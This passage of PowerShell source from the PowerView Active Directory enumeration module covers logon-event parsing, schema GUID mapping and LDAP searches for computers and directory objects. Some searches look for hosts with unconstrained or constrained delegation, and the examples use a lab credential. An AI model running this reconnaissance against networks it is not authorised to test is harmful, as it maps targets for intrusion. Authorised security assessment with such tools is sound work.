        }
        if ($PSBoundParameters['Credential']) { $EventArguments['Credential'] = $Credential }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {

            $EventArguments['ComputerName'] = $Computer

            Get-WinEvent @EventArguments| ForEach-Object {
                $Event = $_
                $Properties = $Event.Properties
                Switch ($Event.Id) {
                    # logon event
                    4624 {
                        # skip computer logons, for now...
                        if(-not $Properties[5].Value.EndsWith('$')) {
                            $Output = New-Object PSObject -Property @{
                                ComputerName              = $Computer
                                TimeCreated               = $Event.TimeCreated
                                EventId                   = $Event.Id
                                SubjectUserSid            = $Properties[0].Value.ToString()
                                SubjectUserName           = $Properties[1].Value
                                SubjectDomainName         = $Properties[2].Value
                                SubjectLogonId            = $Properties[3].Value
                                TargetUserSid             = $Properties[4].Value.ToString()
                                TargetUserName            = $Properties[5].Value
                                TargetDomainName          = $Properties[6].Value
                                TargetLogonId             = $Properties[7].Value
                                LogonType                 = $Properties[8].Value
                                LogonProcessName          = $Properties[9].Value
                                AuthenticationPackageName = $Properties[10].Value
                                WorkstationName           = $Properties[11].Value
                                LogonGuid                 = $Properties[12].Value
                                TransmittedServices       = $Properties[13].Value
                                LmPackageName             = $Properties[14].Value
                                KeyLength                 = $Properties[15].Value
                                ProcessId                 = $Properties[16].Value
                                ProcessName               = $Properties[17].Value
                                IpAddress                 = $Properties[18].Value
                                IpPort                    = $Properties[19].Value
                                ImpersonationLevel        = $Properties[20].Value
                                RestrictedAdminMode       = $Properties[21].Value
                                TargetOutboundUserName    = $Properties[22].Value
                                TargetOutboundDomainName  = $Properties[23].Value
                                VirtualAccount            = $Properties[24].Value
                                TargetLinkedLogonId       = $Properties[25].Value
                                ElevatedToken             = $Properties[26].Value
                            }
                            $Output.PSObject.TypeNames.Insert(0, 'PowerView.LogonEvent')
                            $Output
                        }
                    }

                    # logon with explicit credential
                    4648 {
                        # skip computer logons, for now...
                        if((-not $Properties[5].Value.EndsWith('$')) -and ($Properties[11].Value -match 'taskhost\.exe')) {
                            $Output = New-Object PSObject -Property @{
                                ComputerName              = $Computer
                                TimeCreated       = $Event.TimeCreated
                                EventId           = $Event.Id
                                SubjectUserSid    = $Properties[0].Value.ToString()
                                SubjectUserName   = $Properties[1].Value
                                SubjectDomainName = $Properties[2].Value
                                SubjectLogonId    = $Properties[3].Value
                                LogonGuid         = $Properties[4].Value.ToString()
                                TargetUserName    = $Properties[5].Value
                                TargetDomainName  = $Properties[6].Value
                                TargetLogonGuid   = $Properties[7].Value
                                TargetServerName  = $Properties[8].Value
                                TargetInfo        = $Properties[9].Value
                                ProcessId         = $Properties[10].Value
                                ProcessName       = $Properties[11].Value
                                IpAddress         = $Properties[12].Value
                                IpPort            = $Properties[13].Value
                            }
                            $Output.PSObject.TypeNames.Insert(0, 'PowerView.ExplicitCredentialLogonEvent')
                            $Output
                        }
                    }
                    default {
                        Write-Warning "No handler exists for event ID: $($Event.Id)"
                    }
                }
            }
        }
    }
}


function Get-DomainGUIDMap {
<#
.SYNOPSIS

Helper to build a hash table of [GUID] -> resolved names for the current or specified Domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Get-Forest  

.DESCRIPTION

Searches the forest schema location (CN=Schema,CN=Configuration,DC=testlab,DC=local) for
all objects with schemaIDGUID set and translates the GUIDs discovered to human-readable names.
Then searches the extended rights location (CN=Extended-Rights,CN=Configuration,DC=testlab,DC=local)
for objects where objectClass=controlAccessRight, translating the GUIDs again.

Heavily adapted from http://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-permissions-report-free-powershell-script-download.aspx

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.OUTPUTS

Hashtable

Ouputs a hashtable containing a GUID -> Readable Name mapping.

.LINK

http://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-permissions-report-free-powershell-script-download.aspx
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $GUIDs = @{'00000000-0000-0000-0000-000000000000' = 'All'}

    $ForestArguments = @{}
    if ($PSBoundParameters['Credential']) { $ForestArguments['Credential'] = $Credential }

    try {
        $SchemaPath = (Get-Forest @ForestArguments).schema.name
    }
    catch {
        throw '[Get-DomainGUIDMap] Error in retrieving forest schema path from Get-Forest'
    }
    if (-not $SchemaPath) {
        throw '[Get-DomainGUIDMap] Error in retrieving forest schema path from Get-Forest'
    }

    $SearcherArguments = @{
        'SearchBase' = $SchemaPath
        'LDAPFilter' = '(schemaIDGUID=*)'
    }
    if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
    if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
    if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
    if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
    if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
    $SchemaSearcher = Get-DomainSearcher @SearcherArguments

    if ($SchemaSearcher) {
        try {
            $Results = $SchemaSearcher.FindAll()
            $Results | Where-Object {$_} | ForEach-Object {
                $GUIDs[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainGUIDMap] Error disposing of the Results object: $_"
                }
            }
            $SchemaSearcher.dispose()
        }
        catch {
            Write-Verbose "[Get-DomainGUIDMap] Error in building GUID map: $_"
        }
    }

    $SearcherArguments['SearchBase'] = $SchemaPath.replace('Schema','Extended-Rights')
    $SearcherArguments['LDAPFilter'] = '(objectClass=controlAccessRight)'
    $RightsSearcher = Get-DomainSearcher @SearcherArguments

    if ($RightsSearcher) {
        try {
            $Results = $RightsSearcher.FindAll()
            $Results | Where-Object {$_} | ForEach-Object {
                $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainGUIDMap] Error disposing of the Results object: $_"
                }
            }
            $RightsSearcher.dispose()
        }
        catch {
            Write-Verbose "[Get-DomainGUIDMap] Error in building GUID map: $_"
        }
    }

    $GUIDs
}


function Get-DomainComputer {
<#
.SYNOPSIS

Return all computers or specific computer objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
"-Properties samaccountname,usnchanged,...". By default, all computer objects for
the current domain are returned.

.PARAMETER Identity

A SamAccountName (e.g. WINDOWS10$), DistinguishedName (e.g. CN=WINDOWS10,CN=Computers,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1124), GUID (e.g. 4f16b6bc-7010-4cbf-b628-f3cfe20f6994),
or a dns host name (e.g. windows10.testlab.local). Wildcards accepted.

.PARAMETER UACFilter

Dynamic parameter that accepts one or more values from $UACEnum, including
"NOT_X" negation forms. To see all possible values, run '0|ConvertFrom-UACValue -ShowAll'.

.PARAMETER Unconstrained

Switch. Return computer objects that have unconstrained delegation.

.PARAMETER TrustedToAuth

Switch. Return computer objects that are trusted to authenticate for other principals.

.PARAMETER Printers

Switch. Return only printers.

.PARAMETER SPN

Return computers with a specific service principal name, wildcards accepted.

.PARAMETER OperatingSystem

Return computers with a specific operating system, wildcards accepted.

.PARAMETER ServicePack

Return computers with a specific service pack, wildcards accepted.

.PARAMETER SiteName

Return computers in the specific AD Site name, wildcards accepted.

.PARAMETER Ping

Switch. Ping each host to ensure it's up before enumerating.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainComputer

Returns the current computers in current domain.

.EXAMPLE

Get-DomainComputer -SPN mssql* -Domain testlab.local

Returns all MS SQL servers in the testlab.local domain.

.EXAMPLE

Get-DomainComputer -UACFilter TRUSTED_FOR_DELEGATION,SERVER_TRUST_ACCOUNT -Properties dnshostname

Return the dns hostnames of servers trusted for delegation.

.EXAMPLE

Get-DomainComputer -SearchBase "LDAP://OU=secret,DC=testlab,DC=local" -Unconstrained

Search the specified OU for computeres that allow unconstrained delegation.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainComputer -Credential $Cred

.OUTPUTS

PowerView.Computer

Custom PSObject with translated computer property fields.

PowerView.Computer.Raw

The raw DirectoryServices.SearchResult object, if -Raw is enabled.
#>

    [OutputType('PowerView.Computer')]
    [OutputType('PowerView.Computer.Raw')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SamAccountName', 'Name', 'DNSHostName')]
        [String[]]
        $Identity,

        [Switch]
        $Unconstrained,

        [Switch]
        $TrustedToAuth,

        [Switch]
        $Printers,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePrincipalName')]
        [String]
        $SPN,

        [ValidateNotNullOrEmpty()]
        [String]
        $OperatingSystem,

        [ValidateNotNullOrEmpty()]
        [String]
        $ServicePack,

        [ValidateNotNullOrEmpty()]
        [String]
        $SiteName,

        [Switch]
        $Ping,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $UACValueNames = [Enum]::GetNames($UACEnum)
        # add in the negations
        $UACValueNames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
        # create new dynamic parameter
        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
    }

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $CompSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        #bind dynamic parameter to a friendly variable
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
        }

        if ($CompSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^S-1-') {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match '^CN=') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainComputer] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $CompSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $CompSearcher) {
                            Write-Warning "[Get-DomainComputer] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif ($IdentityInstance.Contains('.')) {
                    $IdentityFilter += "(|(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                else {
                    $IdentityFilter += "(name=$IdentityInstance)"
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['Unconstrained']) {
                Write-Verbose '[Get-DomainComputer] Searching for computers with for unconstrained delegation'
                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[Get-DomainComputer] Searching for computers that are trusted to authenticate for other principals'
                $Filter += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['Printers']) {
                Write-Verbose '[Get-DomainComputer] Searching for printers'
                $Filter += '(objectCategory=printQueue)'
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with SPN: $SPN"
                $Filter += "(servicePrincipalName=$SPN)"
            }
            if ($PSBoundParameters['OperatingSystem']) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with operating system: $OperatingSystem"
                $Filter += "(operatingsystem=$OperatingSystem)"
            }
            if ($PSBoundParameters['ServicePack']) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with service pack: $ServicePack"
                $Filter += "(operatingsystemservicepack=$ServicePack)"
            }
            if ($PSBoundParameters['SiteName']) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with site name: $SiteName"
                $Filter += "(serverreferencebl=$SiteName)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainComputer] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }
            # build the LDAP filter for the dynamic UAC filter value
            $UACFilter | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $UACField = $_.Substring(4)
                    $UACValue = [Int]($UACEnum::$UACField)
                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    $UACValue = [Int]($UACEnum::$_)
                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            $CompSearcher.filter = "(&(samAccountType=805306369)$Filter)"
            Write-Verbose "[Get-DomainComputer] Get-DomainComputer filter string: $($CompSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $CompSearcher.FindOne() }
            else { $Results = $CompSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                $Up = $True
                if ($PSBoundParameters['Ping']) {
                    $Up = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname
                }
                if ($Up) {
                    if ($PSBoundParameters['Raw']) {
                        # return raw result objects
                        $Computer = $_
                        $Computer.PSObject.TypeNames.Insert(0, 'PowerView.Computer.Raw')
                    }
                    else {
                        $Computer = Convert-LDAPProperty -Properties $_.Properties
                        $Computer.PSObject.TypeNames.Insert(0, 'PowerView.Computer')
                    }
                    $Computer
                }
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainComputer] Error disposing of the Results object: $_"
                }
            }
            $CompSearcher.dispose()
        }
    }
}


function Get-DomainObject {
<#
.SYNOPSIS

Return all (or specified) domain objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty, Convert-ADName  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
"-Properties samaccountname,usnchanged,...". By default, all objects for
the current domain are returned.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

.PARAMETER UACFilter

Dynamic parameter that accepts one or more values from $UACEnum, including
"NOT_X" negation forms. To see all possible values, run '0|ConvertFrom-UACValue -ShowAll'.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainObject -Domain testlab.local

Return all objects for the testlab.local domain

.EXAMPLE

'S-1-5-21-890171859-3433809279-3366196753-1003', 'CN=dfm,CN=Users,DC=testlab,DC=local','b6a9a2fb-bbd5-4f28-9a09-23213cea6693','dfm.a' | Get-DomainObject -Properties distinguishedname

distinguishedname
-----------------
CN=PRIMARY,OU=Domain Controllers,DC=testlab,DC=local
CN=dfm,CN=Users,DC=testlab,DC=local
OU=OU3,DC=testlab,DC=local
CN=dfm (admin),CN=Users,DC=testlab,DC=local

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainObject -Credential $Cred -Identity 'windows1'

.EXAMPLE

Get-Domain | Select-Object -Expand name
testlab.local

'testlab\harmj0y','DEV\Domain Admins' | Get-DomainObject -Verbose -Properties distinguishedname
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainUser] Extracted domain 'testlab.local' from 'testlab\harmj0y'
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(samAccountName=harmj0y)))

distinguishedname
-----------------
CN=harmj0y,CN=Users,DC=testlab,DC=local
VERBOSE: [Get-DomainUser] Extracted domain 'dev.testlab.local' from 'DEV\Domain Admins'
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(samAccountName=Domain Admins)))
CN=Domain Admins,CN=Users,DC=dev,DC=testlab,DC=local

.OUTPUTS

PowerView.ADObject

Custom PSObject with translated AD object property fields.

PowerView.ADObject.Raw

The raw DirectoryServices.SearchResult object, if -Raw is enabled.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObject')]
    [OutputType('PowerView.ADObject.Raw')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $UACValueNames = [Enum]::GetNames($UACEnum)
        # add in the negations
        $UACValueNames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
        # create new dynamic parameter
        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
    }

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $ObjectSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        #bind dynamic parameter to a friendly variable
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
        }
        if ($ObjectSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^S-1-') {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match '^(CN|OU|DC)=') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainObject] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $ObjectSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $ObjectSearcher) {
                            Write-Warning "[Get-DomainObject] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                elseif ($IdentityInstance.Contains('\')) {
                    $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                    if ($ConvertedIdentityInstance) {
                        $ObjectDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                        $ObjectName = $IdentityInstance.Split('\')[1]
                        $IdentityFilter += "(samAccountName=$ObjectName)"
                        $SearcherArguments['Domain'] = $ObjectDomain
                        Write-Verbose "[Get-DomainObject] Extracted domain '$ObjectDomain' from '$IdentityInstance'"
                        $ObjectSearcher = Get-DomainSearcher @SearcherArguments
                    }
                }
                elseif ($IdentityInstance.Contains('.')) {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainObject] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            # build the LDAP filter for the dynamic UAC filter value
            $UACFilter | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $UACField = $_.Substring(4)
                    $UACValue = [Int]($UACEnum::$UACField)
                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    $UACValue = [Int]($UACEnum::$_)
                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            if ($Filter -and $Filter -ne '') {
                $ObjectSearcher.filter = "(&$Filter)"
            }
            Write-Verbose "[Get-DomainObject] Get-DomainObject filter string: $($ObjectSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $ObjectSearcher.FindOne() }
            else { $Results = $ObjectSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    # return raw result objects
                    $Object = $_
                    $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject.Raw')
                }
                else {
                    $Object = Convert-LDAPProperty -Properties $_.Properties
                    $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject')
                }
                $Object
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainObject] Error disposing of the Results object: $_"
                }
            }
            $ObjectSearcher.dispose()
        }
    }
}


function Get-DomainObjectAttributeHistory {
<#
.SYNOPSIS

Returns the Active Directory attribute replication metadata for the specified
object, i.e. a parsed version of the msds-replattributemetadata attribute.
By default, replication data for every domain object is returned.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObject

.DESCRIPTION

Wraps Get-DomainObject with a specification to retrieve the property 'msds-replattributemetadata'.
This is the domain attribute replication metadata associated with the object. The results are
parsed from their XML string form and returned as a custom object.

.PARAMETER Identity

